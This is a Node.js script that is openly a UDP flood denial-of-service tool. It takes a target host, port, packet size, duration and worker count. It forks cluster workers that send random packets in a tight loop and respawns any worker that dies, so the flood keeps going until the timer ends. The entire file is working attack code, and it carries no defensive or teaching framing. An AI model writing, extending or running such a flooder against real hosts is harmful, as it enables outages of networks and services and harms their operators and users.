// Must run with NodeJS 16, or later. (tested with node version 18.15).
import dgram from 'node:dgram';
import cluster from 'node:cluster';
const sock = dgram.createSocket('udp4');

if (cluster.isPrimary) {
    if (process.argv.length < 6) {
        console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
        process.exit(1);
    } else {
        console.log(`Host: ${process.argv[2]}\nPort: ${process.argv[3] == 0 ? "random" : process.argv[3]}\nSize: ${process.argv[4] == 0 ? "random" : process.argv[4]}\nTime: ${process.argv[5]}\nThreads: ${process.argv[6]}`);
    }

    for (let threads = 0; threads < process.argv[6]; threads++) {
        const worker = cluster.fork();
        worker.setMaxListeners(0);
        worker.send({ message: "start" });
    }
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died with code ${code} and signal ${signal}`);
        const newWorker = cluster.fork();
        newWorker.setMaxListeners(0);
        newWorker.send({ message: "start" });
    });
} else {
    function randStr(size) {
        let buffer = [];
        for (let b = 0; b < size; b++) {
          buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
        }
        return buffer.join('');
    }
    
    process.argv[3] = (process.argv[3] == 0) ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
    process.argv[4] = (process.argv[4] == 0) ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
    let attackBuffer = randStr(parseInt(process.argv[4]));
    
    function udpFlood(host, port, length) {
        sock.send(attackBuffer, 0, length, port, host, (err) => {
            if (err) {
                throw err;
            }
        });
    }
    
    let attack = setInterval(() => {
        udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
    });
    
    setTimeout(() => {
        clearInterval(attack); // clear the interval, free memory.
        console.log("Attack over!\n");
        process.exit(1);
    }, process.argv[5] * 1000); // time in miliseconds * 1000 = seconds.
}
